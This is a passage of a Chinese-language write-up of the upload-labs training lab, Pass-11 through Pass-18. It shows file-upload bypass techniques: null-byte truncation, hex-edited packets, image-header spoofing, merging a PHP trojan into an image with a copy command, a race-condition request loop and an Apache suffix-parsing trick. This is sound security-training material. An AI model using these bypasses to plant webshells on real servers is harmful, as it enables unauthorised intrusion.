&lt;p&gt;上传 php 抓包发现 save_path=…/upload&lt;/p&gt;
&lt;p&gt;源码中文件保存路径就是 $img_path = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;G&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;E&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mn&gt;10&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mn&gt;99&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi&gt;Y&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_GET[&amp;#x27;save_path&amp;#x27;].&amp;quot;/&amp;quot;.rand(10, 99).date(&amp;quot;YmdHis&amp;quot;).&amp;quot;.&amp;quot;.&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.038em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;G&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;E&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;Y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;file_ext;&lt;/p&gt;
&lt;p&gt;用 00 截断，在路径后面加上 hqxx.php%00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-11-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-11&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-11&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;通过字符拼接，连接路径文件名，后台处理后上传到 windows 时，os 看见 %00 自动截断&lt;/p&gt;
&lt;p&gt;00 截断的前提条件：PHP 版本小于 5.3.4，PHP 的 magic_quotes_gpc 为 OFF 状态&lt;/p&gt;
&lt;p&gt;move_uploaded_file 函数的底层实现类似于 C 语言，遇到 0x00 会截断&lt;/p&gt;
&lt;h1 id=&#34;pass-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-12&#34;&gt;#&lt;/a&gt; Pass-12&lt;/h1&gt;
&lt;h2 id=&#34;过程-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-12&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;上传文件抓包，发现路径也在表单中了，在后面加上 /hqxx.php ，注意后面有一个空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为 post 请求没办法解析 %00，所以我们在 hex 中更改数据包&lt;/p&gt;
&lt;p&gt;找到对应行，代表空格的 20，改为 00&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-12-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-12&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-12&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;为啥网上有人说这是二进制代码，可是这明明不是二进制啊&lt;/p&gt;
&lt;p&gt;通常 JPEG/JPG: FF D8 , PNG:89 50，GIF:47 49&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;JPEG;.JPE;.JPG，”JPGGraphic File”&lt;/li&gt;
&lt;li&gt;gif，”GIF 89A”&lt;/li&gt;
&lt;li&gt;zip，”Zip Compressed”&lt;/li&gt;
&lt;li&gt;doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;pass-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-13&#34;&gt;#&lt;/a&gt; Pass-13&lt;/h1&gt;
&lt;h2 id=&#34;过程-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-13&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;源代码中读取文件前 2 字节，来判断文件类型是否属于 jpg、png 或者 gif 类型&lt;/p&gt;
&lt;p&gt;类型判断成功后，还更改了文件名&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里用文件包含来解析图片马&lt;/p&gt;
&lt;p&gt;手动在 upload 文件夹添加一个文件包含的 php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后浏览器解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-13-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-13&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-13&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;unpack () 函数从二进制字符串对数据进行解包。&lt;/p&gt;
&lt;p&gt;也就是说本身没有文件包含漏洞的话这个图片马是没有办法解析的，唉&lt;/p&gt;
&lt;h1 id=&#34;pass-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-14&#34;&gt;#&lt;/a&gt; Pass-14&lt;/h1&gt;
&lt;h2 id=&#34;过程-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-14&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，换了一种方式验证类型&lt;/p&gt;
&lt;p&gt;getimagesize () 这个函数功能会对目标文件的 16 进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的&lt;/p&gt;
&lt;p&gt;所以还是伪造一个头部信息，上传图片马&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-14-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;图片马的利用可以结合文件包含，解析漏洞等… 反正就是要把他用 php 解析嘛&lt;/p&gt;
&lt;p&gt;比如，&lt;a href=&#34;https://www.cnblogs.com/renhaoblog/p/12874603.html&#34;&gt;nginx 解析漏洞&lt;/a&gt;，和版本无关，属于用户配置不当产生的&lt;/p&gt;
&lt;h2 id=&#34;总结-14&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-14&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://www.runoob.com/php/php-getimagesize.html&#34;&gt;菜鸟教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;getimagesize () 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。&lt;/p&gt;
&lt;p&gt;实例 1：本地图片文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list($width, $height, $type, $attr) = getimagesize(&amp;quot;runoob-logo.png&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;宽度为：&amp;quot; . $width;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;高度为：&amp;quot; . $height;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;类型为：&amp;quot; . $attr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上实例输出结果为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;宽度为：290高度为：69类型为：3属性：width=&amp;quot;290&amp;quot; height=&amp;quot;69&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实例 2：远程图片文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php$remote_png_url = &amp;#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&amp;#x27;;$img_data = getimagesize($remote_png_url);print_r($img_data );?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上实例输出结果为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Array(    [0] =&amp;gt; 290    [1] =&amp;gt; 69    [2] =&amp;gt; 3    [3] =&amp;gt; width=&amp;quot;290&amp;quot; height=&amp;quot;69&amp;quot;    [bits] =&amp;gt; 8    [mime] =&amp;gt; image/png)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;返回结果说明&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;索引 0 给出的是图像宽度的像素值&lt;/li&gt;
&lt;li&gt;索引 1 给出的是图像高度的像素值&lt;/li&gt;
&lt;li&gt;索引 2 给出的是图像的类型，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 =  BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM&lt;/li&gt;
&lt;li&gt;索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签&lt;/li&gt;
&lt;li&gt;索引 bits 给出的是图像的每种颜色的位数，二进制格式&lt;/li&gt;
&lt;li&gt;索引 channels 给出的是图像的通道值，RGB 图像默认是 3&lt;/li&gt;
&lt;li&gt;索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;pass-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-15&#34;&gt;#&lt;/a&gt; Pass-15&lt;/h1&gt;
&lt;h2 id=&#34;过程-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-15&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;使用 exif_imagetype () 检查是否为图片文件&lt;/p&gt;
&lt;p&gt;用图片马进行绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是还得帮 php 安装 exif.so 扩展库&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-15-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-15&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-15&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;exif_imagetype ( string $filename ) : int &lt;em&gt;exif_imagetype()&lt;/em&gt; 读取一个图像的第一个字节并检查其签名。&lt;/p&gt;
&lt;h1 id=&#34;pass-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-16&#34;&gt;#&lt;/a&gt; Pass-16&lt;/h1&gt;
&lt;h2 id=&#34;过程-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-16&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，判断了后缀，然后利用 imagecreatefrompng () 等函数创建图片，同时也利用这个函数判断图片类型是否一致了，然后再重命名文件&lt;/p&gt;
&lt;p&gt;依然用图片马绕过，但是简单的在文件前加入 GIF89a 已经不可&lt;/p&gt;
&lt;p&gt;那就把图片和木马合在一起叭，cmd 执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;copy pig.jpg/b +  a.php/a haha.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再上传 haha.jpg&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-16-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;往下翻可以看到木马被插在了图片的中间&lt;/p&gt;
&lt;h2 id=&#34;总结-16&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-16&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;过过过&lt;/p&gt;
&lt;h1 id=&#34;pass-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-17&#34;&gt;#&lt;/a&gt; Pass-17&lt;/h1&gt;
&lt;h2 id=&#34;过程-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-17&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;看源码，是先上传文件移动到 upload 文件夹后，再对后缀进行判断，判断允许后重命名文件再删除原来的文件，否则直接删除文件&lt;/p&gt;
&lt;p&gt;那就搞文件竞争，在上传文件和删除文件之间的时间，进行访问上传的文件，并且通过上传的文件创建新的木马&lt;/p&gt;
&lt;p&gt;利用 py 脚本不断访问上传的 haha.php&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requestswhile &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;:    requests.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload-labs.com/upload-labs/upload/haha.php&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&#34;http://xn--request-fy3l308svi7bxjr.py&#34;&gt;然后运行 request.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;然后不断点击发包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-17-03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;总结-17&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-17&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;抄作业的感觉，唉&lt;/p&gt;
&lt;h1 id=&#34;pass-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-18&#34;&gt;#&lt;/a&gt; Pass-18&lt;/h1&gt;
&lt;h2 id=&#34;过程-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程-18&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;源代码中，先检查了后缀，大小等等，再上传，再重命名&lt;/p&gt;
&lt;p&gt;它检查后缀用的白名单，所以试一下截断➕竞争&lt;/p&gt;
&lt;p&gt;想法很美好，现实很骨感，看报错信息，是卡在文件名后缀上了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-18-01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以直接和之前一样上传图片马哈哈哈&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;upload-labs-18-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再用文件包含之类的配合…&lt;/p&gt;
&lt;h2 id=&#34;总结-18&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结-18&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
&lt;p&gt;世上无难事只要肯放弃&lt;/p&gt;
&lt;p&gt;值得注意的是这里也可以将 php 文件后缀名更改为.php.7z，因为白名单中允许上传.7z 的文件，但是 apache 又不能解析这个格式，所以会把该文件当 php 的格式解析&lt;/p&gt;
&lt;h1 id=&#34;pass-19&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-19&#34;&gt;#&lt;/a&gt; Pass-19&lt;/h1&gt;
